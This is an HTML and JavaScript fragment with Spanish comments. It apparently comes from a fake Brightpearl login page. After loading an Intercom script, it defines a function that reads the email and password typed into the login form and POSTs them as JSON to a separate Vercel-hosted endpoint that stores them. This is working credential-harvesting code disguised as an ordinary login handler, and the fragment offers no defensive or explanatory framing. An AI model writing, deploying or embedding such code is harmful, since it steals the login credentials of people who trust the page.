  <!-- Script de Intercom -->
  <script src="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/js/intercom.logged.out.js"></script>
  <script>
    // Funciones JavaScript adicionales, incluida la función enviarDatos
    function enviarDatos() {
      var email = document.getElementById("email_address_login").value;
      var password = document.getElementById("password").value;

      fetch('https://brightpearl-test-jcjl4hl2o-mario-collas-projects.vercel.app/api/guardar', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          password: password,
        }),
      })
      .then(response => response.json())
      .then(data => {
        console.log('Respuesta del servidor:', data);
        // Manejar la respuesta del servidor según sea necesario
      })
      .catch(error => {
        console.error('Error al enviar los datos:', error);
      });

      // Evitar que el formulario realice la acción predeterminada
      return false;
    }
  </script>
